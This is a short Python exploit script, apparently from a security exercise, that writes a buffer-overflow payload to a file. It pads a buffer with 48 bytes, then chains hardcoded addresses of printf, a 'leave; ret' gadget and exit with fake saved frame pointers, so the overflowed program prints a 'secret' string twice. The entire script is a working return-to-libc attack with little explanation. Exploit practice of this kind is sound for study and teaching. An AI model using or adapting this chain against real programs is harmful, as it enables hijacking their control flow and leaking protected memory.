#!/usr/bin/env python

"""
Want to call printf("%s\n", &secret) twice.
num args for printf = 2.

buffer
...
$ebp + 5     <- ebp
&printf
&leave; ret;
&fmt_string = $ebp + 14
&secret
$ebp + 9
&printf
&leave; ret;
&fmt_string = $ebp + 14
&secret
&printf
&exit
&fmt_string = $ebp + 14
&secret
fmt_string
"""

buff = '\x38\xd3\xff\xff'
ebp = '\x68\xd3\xff\xff'
base_offset = 48 # $ebp - &buff
ebp_5 = '\x7c\xd3\xff\xff'
ebp_9 = '\x8c\xd3\xff\xff'
ebp_14 = '\xa0\xd3\xff\xff'
printf = '\x60\x8c\xe3\xf7'
leave_ret = '\xff\x84\x04\x08'
exit = '\x60\x80\xe1\xf7'
secret = '\x03\xd4\xff\xff'

with open('abc', 'w') as f:
    f.write(
        ''.join([
            '0' * base_offset,
            ebp_5,
            printf,
            leave_ret,
            ebp_14,
            secret,
            ebp_9,
            printf,
            leave_ret,
            ebp_14,
            secret,
            printf,
            exit,
            ebp_14,
            secret,
            '%s\n',
        ])
    )
